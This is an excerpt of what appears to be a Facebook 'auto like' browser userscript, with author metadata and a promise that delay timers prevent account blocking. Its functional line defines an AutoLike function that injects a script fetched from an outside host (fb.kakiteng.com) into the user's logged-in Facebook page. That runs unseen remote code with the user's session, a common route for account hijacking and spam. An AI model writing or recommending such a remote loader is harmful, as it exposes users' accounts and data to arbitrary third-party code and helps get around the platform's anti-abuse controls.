...
// @description		Auto Like Facebook by Desman Darmawan - Foxtroeng. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			Desman Darmawan
// @authorURL		http://www.facebook.com/vmxgocheat
// @homepage		http://www.foxtroeng.blogspot.com//
...
// ======= Author : Desman Darmawan ========
// ======= Site :www.foxtroeng.blogspot.com=======
// =======================================
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://fb.kakiteng.com/nlac",b.body.appendChild(a);void(0);};}
body = document.body;
